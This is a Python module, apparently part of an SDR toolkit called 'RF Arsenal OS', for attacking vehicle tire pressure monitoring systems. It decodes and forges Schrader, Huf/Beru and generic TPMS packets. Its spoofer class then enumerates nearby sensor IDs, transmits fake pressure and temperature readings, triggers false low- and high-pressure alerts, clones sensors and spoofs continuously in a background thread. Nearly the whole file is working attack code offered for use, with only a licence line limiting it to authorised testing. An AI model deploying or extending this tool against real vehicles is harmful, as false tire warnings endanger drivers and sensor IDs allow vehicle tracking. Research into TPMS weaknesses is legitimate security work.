#!/usr/bin/env python3
"""
RF Arsenal OS - TPMS (Tire Pressure Monitoring System) Module

Comprehensive TPMS security testing including:
- Sensor ID enumeration
- Pressure/temperature spoofing
- Alert triggering (low pressure, high pressure)
- Sensor cloning
- Protocol analysis for major manufacturers

Supported frequencies: 315 MHz (North America), 433.92 MHz (Europe/Asia)
Supported protocols: Generic, Schrader, Huf/Beru, Continental, Pacific

Hardware Required: BladeRF 2.0 micro xA9 or compatible SDR

Author: RF Arsenal Team
License: For authorized security testing only
"""

import struct
import time
import threading
import logging
import numpy as np
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from datetime import datetime

logger = logging.getLogger(__name__)


class TPMSProtocol(Enum):
    """TPMS Protocol types"""
    GENERIC = "generic"
    SCHRADER = "schrader"
    HUF_BERU = "huf_beru"
    CONTINENTAL = "continental"
    PACIFIC = "pacific"
    SIEMENS_VDO = "siemens_vdo"
    TRW = "trw"
    UNKNOWN = "unknown"


class TPMSManufacturer(Enum):
    """TPMS sensor manufacturers"""
    SCHRADER = "Schrader"
    HUF = "Huf/Beru"
    CONTINENTAL = "Continental"
    PACIFIC = "Pacific Industries"
    SIEMENS_VDO = "Siemens VDO"
    TRW = "TRW"
    ORANGE = "Orange Electronic"
    UNKNOWN = "Unknown"


class TPMSModulation(Enum):
    """TPMS RF modulation types"""
    ASK = "ask"
    FSK = "fsk"
    MANCHESTER = "manchester"


@dataclass
class TPMSSensor:
    """TPMS Sensor representation"""
    sensor_id: int
    tire_position: str  # FL, FR, RL, RR, SPARE
    manufacturer: TPMSManufacturer = TPMSManufacturer.UNKNOWN
    protocol: TPMSProtocol = TPMSProtocol.UNKNOWN
    frequency: float = 433.92e6
    
    # Current readings
    pressure_psi: float = 32.0
    temperature_f: float = 70.0
    battery_ok: bool = True
    
    # Captured data
    raw_packets: List[bytes] = field(default_factory=list)
    last_seen: float = field(default_factory=time.time)
    
    def __str__(self) -> str:
        return (f"[{self.tire_position}] ID:{self.sensor_id:08X} "
                f"P:{self.pressure_psi:.1f}psi T:{self.temperature_f:.1f}°F")


@dataclass
class TPMSPacket:
    """TPMS packet structure"""
    sensor_id: int
    pressure_raw: int
    temperature_raw: int
    flags: int
    checksum: int
    raw_data: bytes
    protocol: TPMSProtocol = TPMSProtocol.UNKNOWN
    timestamp: float = field(default_factory=time.time)
    
    @property
    def pressure_psi(self) -> float:
        """Convert raw pressure to PSI"""
        # Most TPMS: pressure_raw * 0.25 - 7 (in kPa), then convert to PSI
        kpa = self.pressure_raw * 0.25
        return kpa * 0.145038
    
    @property
    def temperature_f(self) -> float:
        """Convert raw temperature to Fahrenheit"""
        # Most TPMS: temperature_raw - 50 (in Celsius)
        celsius = self.temperature_raw - 50
        return celsius * 9/5 + 32
    
    def __str__(self) -> str:
        return f"TPMS[{self.sensor_id:08X}]: {self.pressure_psi:.1f}psi {self.temperature_f:.1f}°F"


class TPMSDecoder:
    """
    TPMS Protocol Decoder
    
    Decodes various TPMS protocols from raw RF data
    """
    
    def __init__(self):
        self._known_sensors: Dict[int, TPMSSensor] = {}
    
    def decode_packet(
        self,
        data: bytes,
        protocol: TPMSProtocol = TPMSProtocol.GENERIC
    ) -> Optional[TPMSPacket]:
        """
        Decode TPMS packet
        
        Args:
            data: Raw packet bytes
            protocol: Expected protocol
            
        Returns:
            Decoded packet or None
        """
        if protocol == TPMSProtocol.SCHRADER:
            return self._decode_schrader(data)
        elif protocol == TPMSProtocol.HUF_BERU:
            return self._decode_huf(data)
        elif protocol == TPMSProtocol.CONTINENTAL:
            return self._decode_continental(data)
        elif protocol == TPMSProtocol.PACIFIC:
            return self._decode_pacific(data)
        else:
            return self._decode_generic(data)
    
    def _decode_generic(self, data: bytes) -> Optional[TPMSPacket]:
        """Decode generic TPMS packet"""
        if len(data) < 8:
            return None
        
        try:
            # Common format: [ID 4 bytes][pressure][temperature][flags][checksum]
            sensor_id = struct.unpack('<I', data[0:4])[0]
            pressure = data[4]
            temperature = data[5]
            flags = data[6]
            checksum = data[7]
            
            return TPMSPacket(
                sensor_id=sensor_id,
                pressure_raw=pressure,
                temperature_raw=temperature,
                flags=flags,
                checksum=checksum,
                raw_data=data,
                protocol=TPMSProtocol.GENERIC
            )
        except Exception as e:
            logger.debug(f"Generic decode failed: {e}")
            return None
    
    def _decode_schrader(self, data: bytes) -> Optional[TPMSPacket]:
        """
        Decode Schrader TPMS packet
        
        Schrader format (common):
        - Preamble: 0xAA 0xAA 0xAA
        - Sync: 0x55
        - ID: 32 bits
        - Pressure: 8 bits (x2.5 kPa)
        - Temperature: 8 bits (Celsius + 50)
        - Flags: 8 bits
        - CRC-8
        """
        if len(data) < 9:
            return None
        
        try:
            # Skip preamble/sync if present
            offset = 0
            if data[0] == 0xAA:
                offset = 4
            
            sensor_id = struct.unpack('<I', data[offset:offset+4])[0]
            pressure = data[offset+4]
            temperature = data[offset+5]
            flags = data[offset+6]
            checksum = data[offset+7]
            
            # Verify CRC
            calculated_crc = self._crc8(data[offset:offset+7])
            if calculated_crc != checksum:
                logger.debug("Schrader CRC mismatch")
            
            return TPMSPacket(
                sensor_id=sensor_id,
                pressure_raw=pressure,
                temperature_raw=temperature,
                flags=flags,
                checksum=checksum,
                raw_data=data,
                protocol=TPMSProtocol.SCHRADER
            )
        except Exception as e:
            logger.debug(f"Schrader decode failed: {e}")
            return None
    
    def _decode_huf(self, data: bytes) -> Optional[TPMSPacket]:
        """Decode Huf/Beru TPMS packet"""
        if len(data) < 10:
            return None
        
        try:
            # Huf format varies, this is common variant
            sensor_id = struct.unpack('>I', data[0:4])[0]  # Big endian
            pressure = data[4] << 8 | data[5]  # 16-bit pressure
            temperature = data[6]
            flags = data[7]
            checksum = struct.unpack('>H', data[8:10])[0]  # 16-bit CRC
            
            return TPMSPacket(
                sensor_id=sensor_id,
                pressure_raw=pressure >> 2,  # Adjust for resolution
                temperature_raw=temperature,
                flags=flags,
                checksum=checksum,
                raw_data=data,
                protocol=TPMSProtocol.HUF_BERU
            )
        except Exception as e:
            logger.debug(f"Huf decode failed: {e}")
            return None
    
    def _decode_continental(self, data: bytes) -> Optional[TPMSPacket]:
        """Decode Continental TPMS packet"""
        if len(data) < 9:
            return None
        
        try:
            sensor_id = struct.unpack('<I', data[0:4])[0]
            pressure = data[4]
            temperature = data[5]
            # Continental includes battery voltage
            battery = data[6]
            flags = data[7]
            checksum = data[8]
            
            return TPMSPacket(
                sensor_id=sensor_id,
                pressure_raw=pressure,
                temperature_raw=temperature,
                flags=flags | (0x80 if battery > 0x20 else 0),
                checksum=checksum,
                raw_data=data,
                protocol=TPMSProtocol.CONTINENTAL
            )
        except Exception as e:
            logger.debug(f"Continental decode failed: {e}")
            return None
    
    def _decode_pacific(self, data: bytes) -> Optional[TPMSPacket]:
        """Decode Pacific Industries TPMS packet"""
        # Pacific uses Manchester encoding typically
        if len(data) < 8:
            return None
        
        try:
            sensor_id = struct.unpack('<I', data[0:4])[0]
            pressure = data[4]
            temperature = data[5]
            flags = data[6]
            checksum = data[7]
            
            return TPMSPacket(
                sensor_id=sensor_id,
                pressure_raw=pressure,
                temperature_raw=temperature,
                flags=flags,
                checksum=checksum,
                raw_data=data,
                protocol=TPMSProtocol.PACIFIC
            )
        except Exception as e:
            logger.debug(f"Pacific decode failed: {e}")
            return None
    
    def _crc8(self, data: bytes, poly: int = 0x07, init: int = 0x00) -> int:
        """Calculate CRC-8"""
        crc = init
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 0x80:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
            crc &= 0xFF
        return crc
    
    def identify_protocol(self, data: bytes) -> TPMSProtocol:
        """Attempt to identify TPMS protocol from packet"""
        # Try each decoder
        for protocol in [TPMSProtocol.SCHRADER, TPMSProtocol.HUF_BERU,
                        TPMSProtocol.CONTINENTAL, TPMSProtocol.PACIFIC]:
            packet = self.decode_packet(data, protocol)
            if packet and self._validate_packet(packet):
                return protocol
        
        return TPMSProtocol.UNKNOWN
    
    def _validate_packet(self, packet: TPMSPacket) -> bool:
        """Validate decoded packet sanity"""
        # Pressure should be reasonable (10-60 PSI typical)
        if not 5 < packet.pressure_psi < 80:
            return False
        
        # Temperature should be reasonable (-40 to 185°F typical)
        if not -50 < packet.temperature_f < 250:
            return False
        
        return True


class TPMSEncoder:
    """
    TPMS Packet Encoder
    
    Creates valid TPMS packets for spoofing
    """
    
    def encode_packet(
        self,
        sensor_id: int,
        pressure_psi: float,
        temperature_f: float,
        protocol: TPMSProtocol = TPMSProtocol.GENERIC,
        flags: int = 0x00
    ) -> bytes:
        """
        Encode TPMS packet
        
        Args:
            sensor_id: Sensor ID
            pressure_psi: Pressure in PSI
            temperature_f: Temperature in Fahrenheit
            protocol: Target protocol
            flags: Additional flags
            
        Returns:
            Encoded packet bytes
        """
        if protocol == TPMSProtocol.SCHRADER:
            return self._encode_schrader(sensor_id, pressure_psi, temperature_f, flags)
        elif protocol == TPMSProtocol.HUF_BERU:
            return self._encode_huf(sensor_id, pressure_psi, temperature_f, flags)
        else:
            return self._encode_generic(sensor_id, pressure_psi, temperature_f, flags)
    
    def _encode_generic(
        self,
        sensor_id: int,
        pressure_psi: float,
        temperature_f: float,
        flags: int
    ) -> bytes:
        """Encode generic TPMS packet"""
        # Convert to raw values
        pressure_kpa = pressure_psi / 0.145038
        pressure_raw = int(pressure_kpa / 0.25)
        
        temperature_c = (temperature_f - 32) * 5/9
        temperature_raw = int(temperature_c + 50)
        
        # Build packet
        packet = struct.pack('<I', sensor_id)
        packet += bytes([
            pressure_raw & 0xFF,
            temperature_raw & 0xFF,
            flags & 0xFF
        ])
        
        # Add checksum
        checksum = sum(packet) & 0xFF
        packet += bytes([checksum])
        
        return packet
    
    def _encode_schrader(
        self,
        sensor_id: int,
        pressure_psi: float,
        temperature_f: float,
        flags: int
    ) -> bytes:
        """Encode Schrader TPMS packet"""
        # Preamble and sync
        preamble = bytes([0xAA, 0xAA, 0xAA, 0x55])
        
        # Convert values
        pressure_kpa = pressure_psi / 0.145038
        pressure_raw = int(pressure_kpa / 2.5)  # Schrader uses x2.5 kPa
        
        temperature_c = (temperature_f - 32) * 5/9
        temperature_raw = int(temperature_c + 50)
        
        # Build payload
        payload = struct.pack('<I', sensor_id)
        payload += bytes([
            pressure_raw & 0xFF,
            temperature_raw & 0xFF,
            flags & 0xFF
        ])
        
        # CRC-8
        crc = self._crc8(payload)
        payload += bytes([crc])
        
        return preamble + payload
    
    def _encode_huf(
        self,
        sensor_id: int,
        pressure_psi: float,
        temperature_f: float,
        flags: int
    ) -> bytes:
        """Encode Huf/Beru TPMS packet"""
        # Huf uses big endian and 16-bit pressure
        pressure_kpa = pressure_psi / 0.145038
        pressure_raw = int(pressure_kpa * 4)  # Higher resolution
        
        temperature_c = (temperature_f - 32) * 5/9
        temperature_raw = int(temperature_c + 50)
        
        packet = struct.pack('>I', sensor_id)
        packet += struct.pack('>H', pressure_raw)
        packet += bytes([temperature_raw, flags])
        
        # 16-bit CRC
        crc = self._crc16(packet)
        packet += struct.pack('>H', crc)
        
        return packet
    
    def _crc8(self, data: bytes, poly: int = 0x07, init: int = 0x00) -> int:
        """Calculate CRC-8"""
        crc = init
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 0x80:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
            crc &= 0xFF
        return crc
    
    def _crc16(self, data: bytes, poly: int = 0x8005, init: int = 0xFFFF) -> int:
        """Calculate CRC-16"""
        crc = init
        for byte in data:
            crc ^= byte << 8
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
            crc &= 0xFFFF
        return crc


class TPMSSpoofer:
    """
    TPMS Spoofer
    
    Comprehensive TPMS attack tool for:
    - Sensor enumeration
    - Pressure/temperature spoofing
    - Alert triggering
    - Denial of service
    """
    
    def __init__(
        self,
        sdr_controller=None,
        frequency: float = 433.92e6,
        sample_rate: float = 1e6
    ):
        self.sdr = sdr_controller
        self.frequency = frequency
        self.sample_rate = sample_rate
        
        self._decoder = TPMSDecoder()
        self._encoder = TPMSEncoder()
        
        self._discovered_sensors: Dict[int, TPMSSensor] = {}
        self._scanning = False
        self._spoofing = False
        
        self._modulation = TPMSModulation.ASK
        self._bit_rate = 10000  # 10 kbps typical for TPMS
        
        logger.info(f"TPMS Spoofer initialized: {frequency/1e6:.3f} MHz")
    
    def scan_sensors(
        self,
        duration: float = 30.0,
        callback: Callable[[TPMSSensor], None] = None
    ) -> List[TPMSSensor]:
        """
        Scan for TPMS sensors
        
        Args:
            duration: Scan duration in seconds
            callback: Called for each discovered sensor
            
        Returns:
            List of discovered sensors
        """
        logger.info(f"Scanning for TPMS sensors ({duration}s)...")
        self._scanning = True
        
        start_time = time.time()
        
        while self._scanning and (time.time() - start_time) < duration:
            # Receive samples
            samples = self._receive_samples(int(self.sample_rate * 0.1))
            
            if samples is not None:
                # Demodulate and decode
                packets = self._demodulate(samples)
                
                for packet in packets:
                    if packet.sensor_id not in self._discovered_sensors:
                        sensor = TPMSSensor(
                            sensor_id=packet.sensor_id,
                            tire_position=self._guess_position(packet.sensor_id),
                            protocol=packet.protocol,
                            frequency=self.frequency,
                            pressure_psi=packet.pressure_psi,
                            temperature_f=packet.temperature_f
                        )
                        self._discovered_sensors[packet.sensor_id] = sensor
                        logger.info(f"Discovered: {sensor}")
                        
                        if callback:
                            callback(sensor)
                    else:
                        # Update existing sensor
                        sensor = self._discovered_sensors[packet.sensor_id]
                        sensor.pressure_psi = packet.pressure_psi
                        sensor.temperature_f = packet.temperature_f
                        sensor.last_seen = time.time()
                        sensor.raw_packets.append(packet.raw_data)
            
            time.sleep(0.01)
        
        self._scanning = False
        logger.info(f"Scan complete. Found {len(self._discovered_sensors)} sensors")
        return list(self._discovered_sensors.values())
    
    def stop_scan(self):
        """Stop scanning"""
        self._scanning = False
    
    def spoof_sensor(
        self,
        sensor_id: int,
        pressure_psi: float,
        temperature_f: float = 70.0,
        protocol: TPMSProtocol = TPMSProtocol.GENERIC,
        duration: float = 1.0,
        repeat_count: int = 10
    ) -> bool:
        """
        Spoof TPMS sensor reading
        
        Args:
            sensor_id: Target sensor ID
            pressure_psi: Fake pressure value
            temperature_f: Fake temperature value
            protocol: Target protocol
            duration: Transmission duration
            repeat_count: Number of packet repetitions
            
        Returns:
            True if transmission started
        """
        logger.warning(f"Spoofing sensor {sensor_id:08X}: {pressure_psi} PSI")
        
        # Encode packet
        packet = self._encoder.encode_packet(
            sensor_id,
            pressure_psi,
            temperature_f,
            protocol
        )
        
        # Modulate
        signal = self._modulate(packet, repeat_count)
        
        # Transmit
        return self._transmit(signal, duration)
    
    def trigger_low_pressure_alert(
        self,
        sensor_id: int,
        protocol: TPMSProtocol = TPMSProtocol.GENERIC
    ) -> bool:
        """
        Trigger low pressure warning
        
        Args:
            sensor_id: Target sensor ID
            protocol: Target protocol
            
        Returns:
            True if transmitted
        """
        logger.warning("Triggering low pressure alert")
        return self.spoof_sensor(
            sensor_id,
            pressure_psi=15.0,  # Very low pressure
            temperature_f=70.0,
            protocol=protocol,
            repeat_count=20
        )
    
    def trigger_high_pressure_alert(
        self,
        sensor_id: int,
        protocol: TPMSProtocol = TPMSProtocol.GENERIC
    ) -> bool:
        """
        Trigger high pressure warning
        
        Args:
            sensor_id: Target sensor ID
            protocol: Target protocol
            
        Returns:
            True if transmitted
        """
        logger.warning("Triggering high pressure alert")
        return self.spoof_sensor(
            sensor_id,
            pressure_psi=55.0,  # Very high pressure
            temperature_f=120.0,
            protocol=protocol,
            repeat_count=20
        )
    
    def clone_sensor(
        self,
        source_sensor: TPMSSensor,
        new_id: int = None
    ) -> TPMSSensor:
        """
        Clone a discovered sensor
        
        Args:
            source_sensor: Sensor to clone
            new_id: Optional new sensor ID
            
        Returns:
            Cloned sensor object
        """
        cloned = TPMSSensor(
            sensor_id=new_id or source_sensor.sensor_id,
            tire_position=source_sensor.tire_position,
            manufacturer=source_sensor.manufacturer,
            protocol=source_sensor.protocol,
            frequency=source_sensor.frequency,
            pressure_psi=source_sensor.pressure_psi,
            temperature_f=source_sensor.temperature_f
        )
        
        logger.info(f"Cloned sensor: {cloned}")
        return cloned
    
    def continuous_spoof(
        self,
        sensor_id: int,
        pressure_psi: float,
        temperature_f: float = 70.0,
        protocol: TPMSProtocol = TPMSProtocol.GENERIC,
        interval: float = 1.0
    ):
        """
        Start continuous spoofing (background)
        
        Args:
            sensor_id: Target sensor ID
            pressure_psi: Fake pressure
            temperature_f: Fake temperature
            protocol: Target protocol
            interval: Transmission interval
        """
        self._spoofing = True
        
        def _spoof_loop():
            while self._spoofing:
                self.spoof_sensor(
                    sensor_id,
                    pressure_psi,
                    temperature_f,
                    protocol
                )
                time.sleep(interval)
        
        thread = threading.Thread(target=_spoof_loop, daemon=True)
        thread.start()
        logger.info("Continuous spoofing started")
    
    def stop_spoof(self):
        """Stop continuous spoofing"""
        self._spoofing = False
        logger.info("Continuous spoofing stopped")
    
    def _receive_samples(self, count: int) -> Optional[np.ndarray]:
        """Receive IQ samples from SDR"""
        if self.sdr:
            try:
                return self.sdr.receive(count)
            except Exception as e:
                logger.error(f"Receive error: {e}")
        
        # Simulated samples for testing
        return np.random.randn(count) + 1j * np.random.randn(count)
    
    def _demodulate(self, samples: np.ndarray) -> List[TPMSPacket]:
        """Demodulate TPMS signals from IQ samples"""
        packets = []
        
        # ASK demodulation
        envelope = np.abs(samples)
        threshold = np.mean(envelope) + np.std(envelope)
        bits = (envelope > threshold).astype(int)
        
        # Find packets (simplified)
        data = self._bits_to_bytes(bits)
        
        # Try to decode
        for i in range(len(data) - 8):
            packet = self._decoder.decode_packet(data[i:i+10])
            if packet and packet.pressure_psi > 10:
                packets.append(packet)
                break  # Found one packet
        
        return packets
    
    def _modulate(self, packet: bytes, repeat: int = 1) -> np.ndarray:
        """Modulate packet to IQ signal"""
        # Convert to bits
        bits = []
        for byte in packet:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)
        
        # ASK modulation
        samples_per_bit = int(self.sample_rate / self._bit_rate)
        signal = np.zeros(len(bits) * samples_per_bit * repeat, dtype=complex)
        
        for r in range(repeat):
            offset = r * len(bits) * samples_per_bit
            for i, bit in enumerate(bits):
                if bit:
                    start = offset + i * samples_per_bit
                    end = start + samples_per_bit
                    signal[start:end] = 1.0 + 0j
        
        return signal
    
    def _transmit(self, signal: np.ndarray, duration: float = 1.0) -> bool:
        """Transmit modulated signal"""
        if self.sdr:
            try:
                self.sdr.set_frequency(self.frequency)
                self.sdr.transmit(signal)
                logger.debug("Signal transmitted")
                return True
            except Exception as e:
                logger.error(f"Transmit error: {e}")
                return False
        
        logger.debug("Simulated transmission (no SDR)")
        return True
    
    def _bits_to_bytes(self, bits: np.ndarray) -> bytes:
        """Convert bit array to bytes"""
        # Simplified - would need proper clock recovery
        samples_per_bit = int(self.sample_rate / self._bit_rate)
        
        # Downsample to bit rate
        downsampled = bits[::samples_per_bit]
        
        result = []
        for i in range(0, len(downsampled) - 7, 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | downsampled[i + j]
            result.append(byte)
        
        return bytes(result)
    
    def _guess_position(self, sensor_id: int) -> str:
        """Guess tire position from sensor ID (manufacturer specific)"""
        # This is a rough heuristic, actual mapping varies
        positions = ['FL', 'FR', 'RL', 'RR', 'SPARE']
        return positions[sensor_id % 5]
    
    def get_discovered_sensors(self) -> List[TPMSSensor]:
        """Get list of discovered sensors"""
        return list(self._discovered_sensors.values())
    
    def get_sensor(self, sensor_id: int) -> Optional[TPMSSensor]:
        """Get specific sensor by ID"""
        return self._discovered_sensors.get(sensor_id)
